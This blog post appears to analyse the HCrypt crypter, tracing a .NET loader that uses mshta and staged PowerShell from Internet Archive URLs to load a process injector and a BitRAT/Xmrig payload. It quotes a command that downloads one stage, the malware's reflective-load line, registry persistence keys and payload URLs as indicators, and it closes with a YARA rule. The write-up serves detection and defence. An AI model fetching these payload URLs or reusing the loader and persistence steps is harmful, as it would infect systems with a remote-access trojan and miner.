---
layout: post
title:  "HCrypt Cryptor"
---

Kicking off today's analysis with a sample called `client.exe` on [VirusTotal](https://www.virustotal.com/gui/file/2efad23e5eb0e9a7ba2cbe0cc79d97e242047ec89baefe08568c447d17fe8bb1/detection) ([Malware Bazaar download link](https://bazaar.abuse.ch/sample/2efad23e5eb0e9a7ba2cbe0cc79d97e242047ec89baefe08568c447d17fe8bb1/#intel)). As of this writing, it has 22/70 vendors flagging it. Let's see why.

Dropping it into pestudio for initial triage, it seems to be a C# .NET app.


![ac4852965ede1c6a5540e5f54b48f512.png](/images/d8d6ae6575904cffa08c9e4d0cb20ce2.png)

One of the cool things about .NET malware is that it is trivially decompiled to source. In this analysis, we'll use ILSpy.

If you open the malware in ILSpy and explore, you'll quickly find the main function.

![176f9a9e944b4802501a3198d45869d7.png](/images/5db942a4669e410a9c1438f89e403781.png)

In this case, the executable is just a wrapper for using the built-in Windows program `mshta.exe` to retrieve and execute a remote payload.


![c6e2a5054ee80254768aa5cb7b9f7ac1.png](/images/6f0a95ed2582412a80e452a21fa496f7.png)


Interestingly, this malware is using the legitimate Internet Archive (a.k.a WayBackMachine) to store the malicious payload. In order to get any further with our analysis, we have to retrieve and analyze the remote payload. Since my analysis machine is Windows, I'll use PowerShell to download a copy of the file without executing it. 

```
(New-Object System.Net.WebClient).DownloadFile("https://ia601408.us.archive.org/10/items/encoding_20210419_0856/Encoding.txt", "C:\users\IEUser\Desktop\malware\Encoding.txt")
```

Now we're approaching similar territory to a [previous post](https://www.hacknpatch.com/2021/03/26/IcedId_Maldoc.html). Let's take a look.

This script is minimally obfuscated, so at first glance you can likely decipher it - similar to our PowerShell one liner above to download this file, `mshta.exe` is launching PowerShell to download this next part of the payload ***as a string*** and immediately executing it.


![8df0fcc95ee6740a16e038f4b0ec283b.png](/images/286d4011a4b74dbe8d8fbf4702b217f0.png)

We'll use our PowerShell download one liner again to retrieve the next stage and open it in Notepad++.

On execution, this PowerShell script will create the directory `C:\Users\Public\Run` and set two registry values with a key name of "Run" and a value of `C:\Users\Public\Run`.

- `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`

It will then download two files using PowerShell, `Run.BAT` and `Microsoft.ps1`.


![b856bbf6e2f87f88ef6934298f26ecb3.png](/images/6e99a485766c4ff79420648e30fe9c17.png)


`Run.BAT` sets up a CLSID in the registry with a DLL named `C:\IDontExist.dll`, then uses some obfuscated command line arguments using newly created environment variables.


![456dcdab7062aecba9c9040fbc808d9e.png](/images/6aa8cdb0cb1b4b66ae1f58f62651b5aa.png)

The environment variables are temporary, and serve to break up some string-based detections. To demonstrate -

![61e756adc86d5835580d08d09de9498e.png](/images/943b7704c0364dbcaff29376825119a6.png)


So to easily deobfuscate, we could do something like this:


![fb539e36c1f4ae3b769cb10d5f31e2b0.png](/images/b902743b95d74a11ac92e357403590c4.png)


This brings us to `Microsoft.ps1` - for a script, this is a huge file, over 5MB. It checks for a process named `aspnet_regbrowsers` if it doesn't exist, it reflectively loads an executable into memory.


![1a8c8ed141c35d5018b1e5533a3bdea2.png](/images/05f6a2d16669458998b4e62c44c3c42e.png)


The data seems to be base64 encoded based on character set and commands in the PowerShell script. The first part of the base64 encoding I recognize (from experience) as the MZ header `TVqQ`. To confirm, I copy the whole base64 blob and paste it into CyberChef. There are certainly other ways to do this, but CyberChef allows me to apply additional transformations quickly if needed. I named this binary `aspnet_regbrowsers.exe`.

![40add046ca13b2c2094705a2af7b0d30.png](/images/e5a33d0ee5ce49708674ed05ce4e345d.png)

I use the save icon in CyberChef to download a copy of the binary. Tossing it back in pestudio, we again see that it is a .NET binary.

But back in the PowerShell script, there's also another suspiciously large section.

![fd7661b94e9a5bce55dd11bd0d208e86.png](/images/faae9aa322b04ad48f41ed2703a9ebe0.png)

Based on a hunch, I suspect that these are character codes that decode to ***another*** binary. Pasting into CyberChef confirms. I named this binary `malware2.exe`.


![b272955dc78a1ace92ac8b11f2062728.png](/images/f3297b8e86c846649c494483216e1d80.png)

Since `aspnet_regbrowsers.exe` is .NET, let's check it out again in ILSpy. If we think back to our PowerShell script, we saw this line:
```
[Reflection.Assembly]::Load($a6).GetType('WpfControlLibrary1.LOGO').GetMethod('Run').Invoke($null,[object[]] ($alosh,$a2))
```
This means we should probably focus on the WpfControlLibrary1.LOGO method named "Run" first, inside of `aspnet_regbrowsers.exe`. Looking in our Assemblies panel in ILSpy we spot it, and that it accepts a string and a byte array as arguments, matching what we observed in the PowerShell script.

![c40f4cf9a6af1dcacd46e002d71f5254.png](/images/ea324a584fbe402d812ea4381740fbae.png)

Looking at its "using" statements, we can see it pulls in objects from other places in the code.

![fc3c6fffe2d742da378f297b40922b84.png](/images/14d492d4941f488695775d10ee3eb2ea.png)

Quickly skimming, we can see dynamic imports for process injection.

![9cec95689545bbbfb86792d10ccf2130.png](/images/04e81caab1434ad2bb51a7f580fc49fb.png)

Unfortunately for us, the decompiled source is still highly obfuscated. We already have a good idea of this binary's functionality based on the arguments passed, dynamic imports, and that the character codes translate into a binary. We can skip analyzing the rest of this binary for the time being, and circle back at a later if needed.

Tossing `malware2.exe` into pestudio, it appears to be UPX packed. Typically this is easy to detect, as the secion names will all contain UPX. Another automated tool, Detect It Easy, agrees and identifies version 3.96. You can get the official unpacker for UPX on [GitHub](https://github.com/upx/upx/releases). For a good overview of what UPX does and how to unpack it manually is available [here](https://malware.news/t/the-basics-of-packed-malware-manually-unpacking-upx-executables/35961).

**NOTE: Always make a backup of the packed malware before running an unpacking tool. The UPX unpacker will overwrite the file.**

Running the unpacker is easy - `upx.exe -d malware2-unpacked.exe`.


![95f8293eaee4ff6d7ddf4568303e55fc.png](/images/10fdd76036b54ecfa623fc5a8c80fc84.png)


Pestudio recognizes the unpacked binary as valid, and gives us lots of context with libraries, imports, strings, etc -this is our final adversary payload. Which, according to [Joe Sandbox](https://www.joesandbox.com/analysis/408523/0/html) is BitRAT Xmrig.

This cryptor behvaior overlaps significantly with [Morphisec's reporting](https://blog.morphisec.com/tracking-hcrypt-an-active-crypter-as-a-service), labeling it HCrypt.

Related IOCs

Type|Value
----|-----
`client.exe`| 4336ba1f6f94127f3610a809151dcf5f
`client.exe` | 2efad23e5eb0e9a7ba2cbe0cc79d97e242047ec89baefe08568c447d17fe8bb1
`aspnet_regbrowsers.exe` |
`aspnet_regbrowsers.exe` |
URL | `https://ia801503.us.archive.org/18/items/cmd_20210302/CMD.TXT`
URL | `https://ia801508.us.archive.org/11/items/server_20210419_0848/Server.txt`
URL | `https://ia601508.us.archive.org/15/items/all_20210419_20210419/ALL.txt`
File Created | `C:\Users\Public\Microsoft.ps1`
File Created | `C:\Users\Public\Run\Run.BAT`
Registry Modification | `HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}`
Registry Modification | `HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32`
Regsistry Modification | `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
Registry Modification |  `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`

YARA for Initial HCrypt Loader
```
rule HCrypt {
	meta:
		description = "Rule to detect HCrypt crypter"
		author = "@hackpatch"
		date = 05112021
		url = ""

	strings:
		$mz = {4d 5a}
		$str1 = "mshta" nocase ascii wide
		$str2 = "C:\\Users\\PC 10600\\Desktop\\Projects\\Client\\Client\\obj\\Debug\\Client.pdb" nocase ascii wide
		$str3 = "Client.exe" wide
		$str4 = "WindowsFormsApp1" nocase ascii wide

	condition:
		$mz at 0 and 2 of ($str*)
}
```
